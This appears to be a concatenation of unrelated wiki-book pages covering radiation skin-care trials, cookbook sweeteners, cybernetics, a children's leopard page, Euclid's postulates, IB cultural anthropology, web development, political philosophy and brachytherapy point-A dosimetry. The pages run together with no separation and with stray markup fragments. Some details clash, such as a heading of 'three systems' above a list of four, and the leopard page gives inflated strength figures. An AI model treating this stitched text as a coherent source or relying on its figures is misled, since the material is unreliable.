**Outcome: No difference in any outcome; trend to higher wound pain with gentian violet
**Conclusion: Nonadherent absorbent dressing can be considered for moist desquamation

===Aloe Vera===
*'''Miami; 2001''' PMID 11338761 -- &quot;The effect of aloe vera gel/mild soap versus mild soap alone in preventing skin reactions in patients undergoing radiation therapy.&quot; (Olsen DL, Oncol Nurs Forum. 2001 Apr;28(3):543-7.)
**Randomized. Arm 1) skin clense with mild unscented soap vs. Arm 2) soap + aloe very multiple times daily.

'''Molasses''' is a flavorsome liquid [[Cookbook:Sweeteners|sweetener]].

Molasses is produced during the manufacture of [[Cookbook:Sugar|sugar]]. Sugarcane [[Cookbook:Juice|juice]] is  [[Cookbook:Boiling|boiled]] down to crystallize out the sugar it contains. The remaining liquid is ''light molasses''. Light molasses may be processed again to produce more sugar and the less-sweet ''dark molasses'', which in turn may be processed yet again to produce ''blackstrap molasses''. Darker molasses are also stronger in flavor and higher in vitamins and minerals, such as calcium, magnesium, iron, and potassium. Molasses may be ''sulfured'' to preserve it; this adds a bad taste though.

When the sugarcane juice is boiled less, with no sugar being removed, the result is [[Cookbook:Cane Syrup|cane syrup]]. Unusually dark cane syrup is often sold as molasses. It can be considered a sort of extra-light molasses, with a milder flavor than true molasses.

Dark [[Cookbook:Treacle|treacle]] is a common substitution for molasses. Since [[Cookbook:Brown Sugar|brown sugar]] is made from [[Cookbook:Sugar|sugar]] with molasses added, brown sugar can be a substitute if plain sugar can be removed from the recipe. One [[Cookbook:Cup|cup]] of dark brown sugar contains one cup of sugar plus 2 to 8 [[Cookbook:Tablespoon|tablespoons]] (1/8 to 1/2 cup) of molasses.

'''Treacle''' is a liquid [[Cookbook:Sweeteners|sweetener]].

'''Black treacle''' is equivalent to [[Cookbook:Molasses|Molasses]].

'''Light treacle''' is equivalent to [[Cookbook:Cane Syrup|Cane Syrup]].

When not specified as '''Black treacle''' or '''Light treacle''', you may wish to assume that the recipe calls for a mixture or that it uses molasses with some sugar added back in.</text>

'''Cane syrup''' is a pale liquid [[Cookbook:Sweeteners|sweetener]].

Cane syrup is produced by [[Cookbook:Boiling|boiling]] down [[Cookbook:Cane Sugar|sugarcane]] [[Cookbook:Juice|juice]]. This is similar to the process used to make [[Cookbook:Maple Syrup|maple syrup]]. Unusually thick and dark cane syrup may be sold as [[Cookbook:Molasses|molasses]], though it is sweeter than true molasses.

Light [[Cookbook:Treacle|treacle]], [[Cookbook:Corn Syrup|corn syrup]], and [[Cookbook:Golden Syrup|golden syrup]] are common substitutions.

'''Golden syrup''' is a moderately thick [[Cookbook:Cane Syrup|cane syrup]].

[[Cookbook:Treacle|Light treacle]] is often an exact substitute, but may include [[Cookbook:Molasses|light molasses]].

Substitute with [[Cookbook:Corn Syrup|dark corn syrup]], [[Cookbook:Molasses|light molasses]],  [[Cookbook:Cane Syrup|cane syrup]] or [[Cookbook:Maple Syrup|maple syrup]]. A more exact substitution can be had by boiling down cane syrup, diluting true light molasses and adding sugar, or diluting a so-called &quot;molasses&quot; that has not had sugar extracted from it.

== What is Cybernetics? ==

There are many different definitions of Cybernetics and many individuals who have influenced the direction of Cybernetics. Cybernetics takes as its domain the discovery or design and application of principles of regulation and communication. Cybernetics treats ways of behaving and not things. Cybernetics does not ask &quot;what is this thing?&quot; but &quot;what does it do?&quot; and &quot;what can it do?&quot; Because numerous systems in the living, technological and social world may be understood in this way, Cybernetics is a combination of many traditional disciplines. The concepts which Cyberneticians develop thus form a metadisciplinary language through which we may better understand and modify complex systems.

== History == 

Deriving from the Greek word for steersman (kybernetes), Cybernetics was first introduced by the mathematician Wiener, as the science of communication and control in the animal and the machine (to which we now might add: in society and in individual human beings). It grew out of Shannon's information theory, which was designed to optimize the transfer of information through communication channels (e.g. telephone lines), and the feedback concept used in engineering control systems. 
A more philosophical definition, suggested in 1958 by Louis Couffignal, one of the pioneers of Cybernetics in the 1930s, considers Cybernetics as &quot;the art of assuring efficiency of action&quot;. 
Cybernetics in General Systems Theory is defined as the study of control within a system, typically using combinations of feedback loops. This can be within machines or living structures. First order Cybernetics relates to closed systems, second order includes the observer perspective and third order looks to how these co evolve. 
	
Cybernetics and systems theory study basically the same problem, that of organization independent of the substrate in which it is embodied. Insofar as it is meaningful to make a distinction between the two approaches, we might say that systems theory has focused more on the structure of systems and their models, whereas Cybernetics has focused on how systems function, that is to say how they control their actions, how they communicate with other systems or with their own components. Since structure and function of a system cannot be understood in separation, it is clear that systems theory and Cybernetics should be viewed as two facets of a single approach. 

== Cybernetics Contributions ==
	
The early contributions of Cybernetics were mainly technological, and gave rise to communication technology, feedback control devices, automation of production processes and computers. Another tradition, which emerged from human and social concerns, emphasizes epistemology, how we come to know, and explores theories of self-reference to understand such phenomena as identity, autonomy, and purpose. Some Cyberneticians seek to create a more humane world, while others seek merely to understand how people and their environment have co-evolved. Some Cyberneticians are interested in systems as we observe them, others in systems that do the observing. Some try to develop methods for modelling the relationships among measurable variables. Others seek to understand the dialogue that occurs between models or theories and social systems. 
Early efforts sought to define and apply principles by which systems may be controlled. More recently, Cyberneticians try to understand how systems describe themselves, control themselves, and organize themselves. Despite its short history, Cybernetics has developed a concern with a wide range of processes involving people as active organizers, as autonomous, and as sharing communicators, responsible individuals. 
Interest moved soon to numerous sciences, applying Cybernetics to processes of cognition, to such practical pursuits such as psychiatry, family therapy, the development of information and decision systems, government, management, and to efforts to understand complex forms of social organization including communication and computer networks. 
	
== Pillars of Cybernetics ==

Cybernetics theories tend to rest on four basic pillars: circularity, variety, process and observation. Circularity occurs in its earliest theories of circular causation or feedback, later in theories of recursion and of iteration in computing and now involving self-reference in cognitive organization and in autonomous systems of production. This circular form enables Cybernetics to explain systems from within, making no recurse to higher principles or a priori purposes, expressing no preferences for hierarchy.
Variety is fundamental to its communication, information and control theories and emphasises multiplicity, alternatives, differences, choices, networks, and intelligence rather than force and singular necessity. Almost all Cybernetic theories involve process and change, from its notion of information, as the difference between two states of uncertainty, to theories of adaptation, evolution and growth processes.
A feature of Cybernetics is that it explains such processes in terms of the organization of the system manifesting it, e.g., the circular causality of feedback loops is taken to account for processes of regulation and a system's effort to maintain equilibrium or to reach a goal.
Observation including decision making is the process underlying Cybernetic theories of information processing and computing. By extending theories of self-reference to processes of observation including cognition and other manifestations of intelligence, Cybernetics has been applied to itself and is developing an epistemology of systems involving their observers (second-order Cybernetics) qualitatively unlike the earlier interest in the ontology of systems which are observed from the outside (first-order cybernetics).

== Focus ==
	
While as a meta-theory, the principles and ideas of Cybernetics and Systems Science are intended to be applicable to anything, the &quot;interesting&quot; objects of study that Cybernetics and Systems Science tends to focus on are complex systems such as organisms, ecologies, minds, societies, and machines. Cybernetics and Systems Science regards these systems as complex, multi-dimensional networks of information systems. Cybernetics presumes that there are underlying laws and principles which can be used to unify the understanding of such seemingly disparate types of systems. The characteristics of these systems directly affect the nature of cybernetic theory, resulting in serious challenges to traditional methodology. Some of these characteristics are complexity, mutuality, complementarity, evolvability, constructivity and reflexivity (for additional information consult the appendix). The domain of computing applications has grown so rapidly that labelling anything that uses a computer as &quot;cybernetic&quot; is more obscuring than enlightening. Therefore we would limit the label &quot;cybernetic technology&quot; to those information processing and transmitting tools that somehow increase the general purpose &quot;intelligence&quot; of the user, that is to say the control the user has over information and communication. 

The systemic and the analytic approaches are more complementary than opposed, yet neither one is reducible to the other. The analytic approach seeks to reduce a system to its basic elements in order to study in detail and understand the types of interaction that exist between them. By modifying one variable at a time, it tries to conclude general laws that will enable one to predict the properties of a system under very different conditions. To make this forecast possible, the laws of the additivity of elementary properties must be invoked. This is the case in homogeneous systems, those composed of analogous elements and having weak interactions among them. Here the laws of statistics readily apply, enabling one to understand the behaviour of the multitude of disorganized complexity. The laws of the additivity of elementary properties do not apply in very complex systems composed of a large diversity of elements linked together by strong interactions. These systems must be approached by methods such as those which the systemic approach groups together. The purpose of the new methods is to consider a system in its complexity, its totality, and its own dynamics. Through simulation one can &quot;animate&quot; a system and observe in real time the effects of the different kinds of relations among its elements. The study of this behavior leads in time to the determination of rules that can modify the system or design other systems.

[[Image:Leopard on the tree.jpg|right|thumb|Leopard relaxing in a tree]]
The '''leopard''' is the champion athlete of the cat world.  Most big cats can pull with five times as much force as the same weight of human athletes.  The leopard can pull seven times as hard.  It would take three Olympic class weightlifters merely to achieve a draw at tug of war with one 100 pound leopard.  This amazing strength is demonstrated when a successful hunter scrambles up the side of a tree with a full grown antelope in its jaws to eat in peace.  

The leopard gets its name from the ancient Greek words for &quot;lion&quot; (leon) and &quot;panther&quot; (pard).

== Where do leopards live? ==
[[Image:Leopard prevalence.png|left|200px]]
Leopards live in the Middle East, parts of Asia, and Africa. This means they live in more places than any other big cat. Leopards spend a lot of time in trees, often sleeping draped over a branch. They will even pull entire prey animals up into the branches where they can eat without having to fight off other predators trying to steal their food.

== What do leopards look like? ==
[[Image:Baby spotted leopard.jpg|right|thumb|A baby spotted leopard cub.]]
Leopards are usually 6.5-10 feet (2-3 m) long, including 23-43 inches (58-110cm) of tail, and weigh about the same as a human or a large dog, 65-155 pounds (30-70 kg). They stand 17.5–30.5 inches (43-78 cm) tall. Female leopards are usually only two-thirds the size of male leopards.

A leopard's coat is short and sleek. Depending on where it lives, a leopard's coat can be a pale straw color, grey, ochre, or black. All leopards have black spots. Because the fur in a leopard's spots is thicker and more coarse, they can be felt as well as seen. 

Black leopards are sometimes called panthers, and they were once thought to be a separate species.  Though they are all black, they still have the black spots that leopards are famous for.  On black leopards, these spots are only slightly darker than the surrounding fur, but under very bright light, they stand out from the lighter, somewhat purplish, background fur.

== What do leopards eat, and how do they catch their prey? ==
Leopards tend to eat antelopes and similarly sized herd animals.  They avoid the larger herbivores, such as water buffalo, because the larger beasts can only be safely captured by groups of animals that hunt in teams, such as lions.  Leopards also eat smaller animals including rodents, rabbits, and even large insects. Some have been known to eat Nile crocodiles, which are powerful reptiles!

They are known to kill and eat dogs, so those persons who bring a dog into leopard country are advised to cage the dog so that it does not become food for leopards.

==Fun facts==
* In captivity, leopards are the most temperamental of the large cats and can be difficult to handle. While they can be affectionate, they cause an unusually large number of animal-related injuries among caretakers in zoos, circuses, and animal care centers.
* It is built like and acts much like a house cat, so anyone fascinated by the big cats might as well have a house cat that behaves much the same as a leopard -- except that a house cat can't hurt you a lot when it scratches or bites.
* One of the funniest movies ever made was one called ''Bringing Up Baby''. It is old -- it was made in 1939 and it is in black-and-white -- and it stars a leopard named &quot;Baby&quot; that creates problems for the great human movie stars Cary Grant and Katherine Hepburn. (If you don't know who Cary Grant and Katherine Hepburn are, then ask an adult over 50. Those were two of the greatest movie stars ever). 
But don't ask for a pet leopard. A little house cat is far safer.

      <text xml:space="preserve">'''Entomology''' is the scientific study of insects. Insects have many kinds of interactions with humans and other forms of life on earth, so it is an important specialty within biology; unlike many other fields however, entomologists include both persons studying insects for their own sake, and those employed by commercial concerns interested in the control of insects. This divides the field into basic and applied entomology.

The definition is sometimes widened to include the study of other terrestrial arthropods, such as spiders, scorpions, and ticks.

      <text xml:space="preserve">'''Postulates''' in geometry are very similar to axioms, self-evident truths, and beliefs in logic, political philosophy and personal decision-making.  The five postulates of '''Euclidean Geometry''' define the basic rules governing the creation and extension of geometric figures with '''ruler and compass'''.  Together with the five axioms (or &quot;common notions&quot;) and twenty-three definitions at the beginning of Euclid's ''Elements'', they form the basis for the extensive proofs given in this masterful compilation of ancient Greek geometric knowledge.  They are as follows:

# A straight line may be drawn from any given point to any other.
# A straight line may be extended to any finite length.
# A circle may be described with any given point as its center and any distance as its radius.
# All right angles are congruent.
# If a straight line intersects two other straight lines, and so makes the two interior angles on one side of it together less than two right angles, then the other straight lines will meet at a point if extended far enough on the side on which the angles are less than two right angles.

Postulate 5, the so-called '''Parallel Postulate''' was the source of much annoyance, probably even to Euclid, for being so relatively prolix.  Mathematicians have a peculiar sense of aesthetics that values simplicity arising from simplicity, with the long complicated proofs, equations and calculations needed for rigorous certainty done behind the scenes, and to have such a long sentence amidst such other straightforward, intuitive statements seems awkward.  As a result, many mathematicians over the centuries have tried to prove the results of the ''Elements'' without using the Parallel Postulate, but to no avail.  However, in the past two centuries, assorted '''non-Euclidean geometries''' have been derived based on using the first four Euclidean postulates together with various negations of the fifth.

&lt;!-- anyone know which is the first proof that requires Postulate 5?  I think it's I.29 or I.24, maybe I.39? --&gt;

      <text xml:space="preserve">==Overview==
This volume serves as a textbook for the IB Cultural Anthropology Course. The text acts as  review for the material to reinforce the knowledge needed to do well on the IB Examination. The course will be divided into thirteen chapters. These chapters are, in turn, divided into sections. 

It should be noted that this book correlates to the standard level course.
The higher level course requires more ethnography and has a larger theory component.

&lt;/table&gt;
&lt;/div&gt;

Back-end development references a client server architecture common in ecommerce.  Client side tends to have a strong user interface skill and the server side a strong API skill. But they overlap.

A backend developer could just be focused on a database and providing an API to it or on a server language like PHP and those mentioned so far and provide an API to it. Their work would need to be accessible to many other back end applications such as the database developer example and more to many front end applications. For example today many web backends service not only desktop and mobile web front ends but also device apps and even desktop apps. So the back end developer will not know how all of those front ends work but provide a server side interface such as a REST interface for those multiple front end technologies to access such as a login. Server developer can also make user interfaces that are probably less robust for administrative access to their code, functionality and data. 

A front end developer in a client server architecture could be an app developer such as with Android, iOS or Windows and even be a specialist in one of those working with the UI libraries available in those OSs. They could be a desktop developer such as MacOS or Windows or Linux working with the UI libraries available in those OSs. Pretty much everyone on client side have knowledge of HTML CSS as that shows up even in native apps.  User interface developers often have skills at building and using APIs. For example the Javascript angular.js MVC or the iOS MVC and the javascript JQuery API. In this sense a front end developer could be working with data API once it arrives on the client side and have less to do with the actual look and feel aspect of the front end. 

In all cases an overlap in skills is a good to have for communication among the team and debugging client server apps. I always joke that the UI person takes the blame for anything that seems to go wrong because it is the cover to the book. In resolving the problem sometimes the UI person needs to clearly understand the surface interface language or at least the API of the server side to help isolate the problem solving effort. Same goes for the server side developers. However they are at the disadvantage because they could be serving many different client side technologies. So they often fall back to their own testing of the API hooks to isolate and remove themselves from the problem solving issues. But you can see the communication not only person to person on a professional team basis but mores on data transmission, the structure and tagging of the data is improved when both sides have a good understanding of their respective technologies to the extend of the data.

The backend to a website is pretty much ''everything the user can't see''. Generally, this means the programming that generates pages that the user views, creating the &quot;server-side&quot; content of the site. This could be scripts, directives, databases, and other automated functions the server performs.

Back-end development includes the server implementation and it more on the logical interaction of data, how it is stored, and transmitted.
Back-end developers typically work with programming languages such as PHP, Python, Go, and new Javascript libraries like Node.

&lt;/div&gt;

One of the most important tasks for a web developer before any work is begun on the page is the conception stage. After a concept has been developed, it is important that the developer thinks of his or her website in realistic terms. 

For example, if a database will be necessary, consider how much space an entry will take up, and how many entries there will be total. Think of the hardware requirements of your site. Think, using what knowledge of programming and backend you may already have (or consulting a professional), if what you are trying to do will even be ''possible''.

Most importantly, keep in mind the limitations of your human resources. You should have an idea of what size operation you're going to be running: money, men, etc. You don't want to stretch your people too thin. If you think it may be necessary to scale down your project to make it more realistic from a human resources point, then do it. It's better to be overcautious than to work your men and yourself into the ground.

Also, mind your capital and other resources. In Section 3.1, '''What's needed to develop a website?''', we'll be covering this more in-depth. For now, just use common sense. One person didn't make Amazon.com on one dime in one day.

      <text xml:space="preserve">In order to meet the goal of cultural anthropology- understanding culture- there first must be a working definition of '''culture'''. There are, however, almost as many definitions of culture as there are anthropology texts. Though there is no single, accepted definition, there are several characteristics that most definitions agree upon from which one can draw a general idea as to what the concept of culture is. 

==Definition==
The first respected definition of culture was written by Sir Edward Tylor. He stated that culture is &quot;''that complex whole that includes knowledge, belief, art, morals, law, custom and any other capabilities and habits acquired by man as a member of a society.''&quot; In short, everything one does is a product of culture. However, culture is not only the behavior of an individual, but also the thought processes and perceptions of the world of an individual. A scientist, for example, might view a flower blooming in a radically different way from an artist. In addition to thought processes, culture needs to be able to be transmitted from generation to generation. Thus, culture must be something that can be learned. Essentially, we can for the purpose of this course state the basic definition of culture as:

&lt;center&gt;''The patterns of thought and behavior that are transmitted by a society that can be used to predict the actions of members of that culture''&lt;/center&gt;

==Tacit &amp; Explicit Culture==
This definition of culture pervades throughout the lives of its members- sometimes explicitly, sometimes in subtler forms. Explicitly, one knows that in American culture, forks go to the left of the plate and knives to the right. When setting the table, one might have to think to oneself to which side each utensil goes. More tacit culture, however, is the knowledge of which foods to use which utensils. One just ‘knows’ to eat a salad with a fork and soup with a spoon. One wouldn’t need to hesitate to decide as one might when setting the table. The more apparent aspects of one’s culture that a member can consciously identify are said to be part of the '''explicit culture'''. Subconscious and unconscious aspects of one’s culture are said to be part of the '''tacit culture'''. 

==Ideal &amp; Real Culture==
In defining culture, one also needs to make a distinction between '''ideal''' and '''real''' culture. One might find, in creating a model of the rules a society follows, it is much easier to create a model based on the ideal culture. In the Yanomamo, for example, a model for marriage patterns would be very simple based on ideal culture- one should marry one’s cross cousin! However, the Yanomamo don’t live ideally, and neither does any other culture. The kinship status of some members may arbitrarily change so that they will be “cross-cousins” and therefore eligible marriage partners. Creating a model of this real culture is much uglier, but is the reality of the situation. In studying cultures anthropologically, one must take into account both the ideal and real versions of a culture.

      <text xml:space="preserve">As one might expect, all cultures must share several characteristics if “culture” is to be differentiated from other forms of behavior. These similarities between all cultures are surprisingly few. The ultimate goal of cultural anthropology is to determine which characteristics all cultures share in common. 

==Society==
Firstly, all culture must take place through a medium of a group of people, known as a '''society'''. Even extinct (e.g. Greek or Roman) or imagined (e.g. science-fiction novels) cultures have societies to transmit the culture (even if the societies, too, are dead or fictional). As culture cannot exist without a society, a human society cannot exist without culture. Other animals, such as bees or ants, congregate into societies, yet these animals do not exhibit culture. Yet no human society is without culture. The functionalist school of anthropological thought attempts to explain why culture is so vital to human societies. 

==Cultural Integration==
It is vital to the study of cultural anthropology that the anthropologist take '''cultural integration''' into account. All aspects of culture relate to one another, so an analysis of a culture must be done '''holistically'''. Changes to one seemingly unimportant part of a particular culture can reverberate throughout the entire culture and affect even the most unrelated aspects. 

It would be a difficult science if the anthropologist were to only examine the whole culture, however. In order to properly gain ample data, the anthropologist will typically divide the culture into arbitrary categories. For example, the anthropologist might study eating patterns, kinship, and warfare. However, the study is not finished after the data has been collected. The anthropologist then needs to describe how these ostensibly unrelated categories affect each other. Anthropology is thus a holistic science.

===Tsembaga===
A standard example of the integration of a culture is that of the Tsembaga of Papua New Guinea. Upon analysis, one sees that wealth, kinship, warfare, and food are all interrelated though one would think that one would hardly have anything to do with the next.

In the Tsembaga culture, pigs are a symbol of power and wealth. Thus, if a man wants to be powerful, he must own many pigs. However, in order to own that many pigs, he needs to feed the pigs with yams. But only Tsembaga women are allowed to grow yams. So if a man wants to be powerful, he must have many wives, which introduces a marriage system of polygamy. 

One will notice, however, that this system will only hold itself for so long- in a polygamous society there usually needs to be less men than women. Otherwise, unsuccessful men become disgruntled and the culture comes into crisis. Also, if one has many wives, the pigs will become well-fed and fertile. After some time there will be too many pigs- the yams will all go to the pigs and the humans won’t have any left over to survive. 
To avoid this problem, the Tsembaga then attempt to gain more land for growing yams- but their neighbors own that land. Thus, the two groups war against each other. Men die in the process and the unequal male-female ratio is retained. After the war ends there is a great celebration. To celebrate the end of a war, the Tsembaga sacrifice huge numbers of pigs. 

Thus, the initial conditions are restored and through the integration of these various aspects the culture is able to persist. Had the anthropologist studied only one of these traits of the culture, say marriage patterns, the anthropologist would have been unable to determine how the Tsembaga are able to retain an unequal male-female ratio and thus be capable of supporting polygamy.

==Symbolism==
Humans are abstract creatures, and culture takes advantage of that. In this culture, for example, people work ferociously in order to gain small bits of green paper. While this paper has little practical value, the society attaches symbolic value to it to make it represent wealth. Likewise, people may hold positions of power and be called a “boss,” “chief,” or “president.” In each of these cases, there is no significant physical difference between a “boss” and a “subordinate.” The title and position are symbols of one’s power over another. 

The symbol most fundamental to culture is that of language. Physically, language is just sound waves being created and modified in various ways by the mouth and throat. However, our minds and culture attaches meaning to particular sound waves so that humans can communicate much more sophisticatedly than animals. Indeed, the same is true for written language. To a Chinese speaker, these lines would have no meaning. However, English speakers are able to attach meaning to these lines so the concept of anthropology can be effectively transmitted. One will spend hours attempting to commit these lines to memory. Then, one can successfully take the IB examination, create more random lines and receive a number in exchange for the hours of work. Culture is fraught with symbolism.

      <text xml:space="preserve">Culture exists at various levels and changes to varying degrees between these levels. One can generalize these levels to be:

*International
*National
*Subcultures
*Individual

==Levels==
===International===
General cultural traits often extend beyond borders. Much of Latin America, for example, shares the same overall culture. Similarly, The US and Canada share many cultural standards. International culture tends to be very broad, however, and one will find a wide range of variation between the culture of, for example, Peru and Brazil. '''International culture''' is the most general classification of culture. 

===National===
For the most part, the people within a nation tend to have the same general cultural characteristics. Americans, for example, tend to value individual freedom over extensive family ties. These '''national cultural traits''', however, are almost as weak as international cultural traits. Indeed, one could often find groups of people who share more in common with a group of people in another country than in their own. This tends to be the case in areas where borders were arbitrarily drawn for political reasons. (E.g. Africa or the Middle East.) 

===Subcultures===
Within any given culture (especially a large culture), one would be likely to find '''subcultures'''. In America, for example, the various economic classes form their own subcultures. Middle class families, for example, tend to emphasize individualism and happiness, whereas lower class families tend to emphasize obedience more. Both groups are still very much a part of the American culture; however, it is the distinction that can be made between them that makes them subcultures. 

Occasionally a subculture might have to practice its culture secretly. During the early 1960s, for example, homosexuality was illegal, so homosexual cultures needed to maintain secrecy. Jewish culture during the 1930s in Nazi Germany is another example. Such subcultures are called '''clandestine cultures'''. 

===Individual Variation===
Culture is different for every member, and any study of culture must take into account those differences. Men and women tend to view their culture differently due to different places in society, and likewise a chief is likely to view the culture differently than a peasant. Despite these differences, the actual variation relative to another culture is negligibly small. 

==Pluralistic Societies==
Societies in which multiple cultures enhabit the same geographic and political region are called '''pluralistic''' societies. The United States is a weakly pluralistic society- there is a great deal of individual variation and a high number of subcultures. However, for the most part, these sub cultures maintain most of the values of the nation as a whole. More strongly pluralistic societies can be found in, for example, Bosnia. Often violence erupts in strongly pluralistic societies because members of different cultures cannot understand each other and conflict arises when they don't operate by the same rules.

      <text xml:space="preserve">==Definition==
If a culture is to survive, it must find a way to pass itself through generations. All cultures do this through '''enculturation'''- the transmission of cultural knowledge to children. As children grow up, they learn the accepted behaviors of their society. However, enculturation is not simply the learning of accepted behaviors. Any animal can be conditioned to perform certain behaviors, yet these animals are not being encultured. When one is encultured, one not only learns proper behaviors, but the proper way of perceiving the world. 

==Yanomamo vs. Semai Enculturation==
A Yanomamo boy, for example, will learn certain behaviors as he grows up. He will learn to begin fighting whenever he gets angry. Yet, not only will he learn to fight, he will also begin to perceive fighting and “fierceness” as a noble and valiant behavior. A Semai boy, on the other hand, will not only learn radically different behavior, but will gain a radically different perception of the world. The Semai boy will learn to never express his anger or lash out in violence. After time, however, he will not only never physically express anger, but he will not view anger as a prized trait and so will rarely get angry.

      <text xml:space="preserve">On their own, humans are not very good at surviving. Humans have weak muscles relative to their size and even the few they have are not very agile. They lack a strong hide and do not have much fur. In fact, humans are physically inferior to nearly every other species on the planet. The evolutionary trait that humans have grown to compensate for this physical weakness is culture. Culture provides humans with the knowledge of how to survive in their environment. Methods for food-getting and creating shelter are purely cultural traits- humans are not born with this knowledge. 

Because environments change over time, the culture living in that environment, too, must change over time. Because cultures must constantly adapt to meet the changing needs of societies, cultures are dynamic systems. Anthropologists often take this into account and periodically update ethnographies with an extra chapter dedicated to changes in the culture since the ethnography was written.

      <text xml:space="preserve">The Functionalist school of anthropological thought was created by Alfred '''Radcliffe-Brown'''. The doctrine of '''functionalism''' states that all cultural traits arise as human adaptations to survive in a particular environment. So, any trait can be analyzed to find a function related to the survival of the individual or society. 

==Survival Needs==
===Individual===
Culture must meet the survival needs of the individual and of the society. Needs of the individual are:

*Method for getting food
**This is perhaps the most important function of culture. Without a method of getting food, social structure falls apart. 
*Tools
**This is often related to the other survival needs, but is necessary nevertheless.
*Safety
*Relations to other humans
*Medical Needs
*Fear / Stress

===Society===
Needs of the society are: 

*Reproduction
**Children also need to be socialized
*Production and distribution of resources
*Maintenance of order
**Gossip is predominantly used in preliterate societies

===Institutions===
To accomplish these needs of both individual and society cultures generally have certain institutions (among others): 

*Kinship
*Government
*Law
*Economy
*Religion

Above all, a culture must motivate humans to survive. Cultures must provide humans with a meaning in life at some level that wills them to put the effort into survival. Without this fundamental motivation, humans would not perform the work needed to continue their existence and the culture would become extinct.

Actually, both Radcliff-Brown and Malinowski is credited with fuctionalism. Radcliff-Brown developed a brach called structural-functionalism.

==Radcliffe-Brown vs. Malinowski==
Two interpretations of the functionalist school of thought exist: that of Radcliffe-Brown, and that of Malinowski. Alfred '''Radcliffe-Brown''' is associated with Structural Functionalism arguing that all of culture serves to support the social structure of the group. The needs of the group must first be met before the needs of the individual can be addressed. Bronislaw '''Malinowski''', however, is associated with Psychological Functionalism which states that all behaviors primarily support the needs of the individual. Any support to the social structure as a whole merely grows out of those behaviors that are advantageous to an individual.

==Analysis==
In both interpretations, functionalists analyze culture in three categories: 

*Structure
*Function
*Organization

===Structure===
The '''structure''' of a culture is a general description of the culture itself. It consists of the rules and principles that govern behavior and thought. Institutions of the culture such as the kinship or economic system are described under the structure of the culture. The structure of a culture is what allows social order to exist. Structure is what maintains relationships among individuals and groups. 

===Function===
The '''function''' of various cultural traits could be described closely, but not quite correctly as the ‘purpose.’ Function is the way that the structure of a culture serves individual and group needs. Function often describes the integration of a culture by relating one trait of a culture indirectly involved with survival to another one more directly involved with survival. 

Often cultures might have the same institution, yet for different reasons. Functionalism is well suited for analyzing these cultures because it provides clear reasons as to why subtle differences between the two structures exist. Functionalism becomes cumbersome, however, in analyzing cultures in which the function is the same but the structure is radically different. In other words, functionalism cannot provide for variation between cultures. 

===Organization===
A culture often provides an individual with several choices of behavior in a given situation. These choices are called one’s '''agency'''. Agency can be thought of as a restricted free will. One has a range of choice, but these choices are strongly constrained by the bounds of one’s culture. Regardless of the actual situation or choices, however, the agency will always promote self-interest and the interest of the group.

      <text xml:space="preserve">The anthropological doctrine of cultural relativism discussed previously has the potential for a wide range of abuse. Seemingly any behavior would be permissible under the guise of “cultural differences.” Some offences are too strong to bear under any culture, however, so cultural relativism is tempered by human rights. 

==Human Rights==
Human rights are those rights vested in any individual:

*Right to speak freely
*Right to hold personal religious beliefs 
*Right to not be murdered
*Right to not be enslaved
*Right to not be imprisoned without charges

These rights transcend culture and governments and are inalienable to any human. However, because of the universal nature of these rights, several that we consider to be ‘inalienable’ are not considered at all by other cultures. These problem human rights are gender equality, political equality, and economic equality. While we may marvel at the gender inequality throughout the world, we would be horrified to practice economic equality and share our wealth with those around us. 

==Cultural Rights==
Not only do humans have rights, but cultures have rights as well. These are vested in groups, not individuals:

*Right to preserve culture
*Right to raise children in that culture
*Right to the culture’s language
*Right to not be deprived of economic base
*Right to self-determination
*Right to home rule
*Right to religious freedom

These rights are similar to human rights and are just as important- without a culture humans cannot survive anyway, so human rights would become worthless. 

==Intellectual Property Rights==
Today, problems arise with intellectual property rights. Cultures often like to decide for themselves which icons are allowed to be used by others as an attempt to preserve a cultural base. Christians, for example, would not often encourage the sale of a paint-by-number Jesus figurine. The problem arises when deciding who exactly “owns” the idea since cultures themselves cannot own anything in our culture.

Added a link back to the IB homepage, but I was wondering as to the necessity of your [[IB Cultural Anthropology/Contributors]] section. If anyone looks at the page history, I'm certain they'd be able to figure out who did all the work. Just a question...

People develop web pages for two main reasons: personal and professional. This book deals mostly with the latter: a medium to large-sized operation designed to generate income.

=== Personal ===
Many people have set up websites to serve their personal interests. There are a huge number of reasons people do this, from sharing information about themselves, to preaching their beliefs, to putting up a resume to be hired or sometimes people publish virtual journals called &quot;blogs&quot;.

Often a number of people collaborate on a website, like a forum or blog. But, since these sites are not designed for the specific purpose of generating revenue, they are still personal sites.

=== Professional ===
Many businesses (perhaps all someday) have web pages. Some are created simply to get the word out about their business: phone number, address, etc., to increase traffic to its physical location.

Many other companies have websites designed to bring in more income. They act as virtual storefronts, shipping to your doorstep or allowing you to pick up goods in person. This book deals with the development of a professional website created to promote your business.

'''Ancient Political Philosophy''', whose major representatives are Socrates, Plato, and Aristotle, is an inquiry into the nexus of arete (excellence, virtue) and politics. In other words, it emphasizes the connection between ethics as the care of the soul and politics as the care of the polis (city, state).  

Perhaps the most important work of ancient political philsophy is Plato's [[w:Republic (Plato dialogue)|Republic]], a dialogue in which Socrates discusses the ideal city-state with other guests at the house of his friend Cephalus.  This dialogue is the source of the idea that the state should be ruled by philosopher-kings, a specially trained class which has demonstrated their ability through a lifetime of musical, philosophical, military, and political training.  It is also notable for its criticism of democracy: despite the modern enthusiasm for democracy and the democracy present in Athens at the time of its writing, Socrates lists democracy as the second worst of the four non-ideal forms of government.  Another well-known work is Aristotle's Politics.

==Intracavitary brachytherapy==
Three systems:
*Paris system
*Stockholm system
*Manchester system
*Madison system (HDR)

===Manchester system===
*'''Point A''' dose definitions:
*:Allegedly, Point A corresponds to the ''paracervical triangle'' in the medial edge of the broad ligament where the uterine vessels cross the ureter
**Original definition: draw a line connecting the superior aspects of the vaginal ovoids and measuring 2 cm superior along the tandem and then 2 cm perpendicular to this. (weakness: failure of localization radiographs to show the surface of the ovoids' caps)
**Revised definition #1: 2 cm above the external cervical os and 2 cm lateral to midline
**Revised definition #2 (1953, Tod &amp; Meredith): 2 cm above the distal end of the lowest source in the tandem and 2 cm lateral to the tandem
**Common variation: use flange at cervical os

*'''Point B''' - 5 cm lateral from the midline at the same level as Point A

The Manchester applicators consisted of a rubber tandem and two ellipsoid &quot;ovoids&quot; with diameters 2, 2.5, and 3 cm.  No shielding in ovoids, so needed generous packing anteriorly and posteriorly.  Used radium.  Used 17.5, 20, and 22.5 mg Ra for the small, medium, and large ovoids, respectively.  

Designed such that:
*Point A dose rate was approximately 0.53 Gy/hr for all allowed applicator loadings
*Vaginal contribution to Point A was limited to 40% of the total dose
*The rectal dose should be 80% or less of the Point A dose

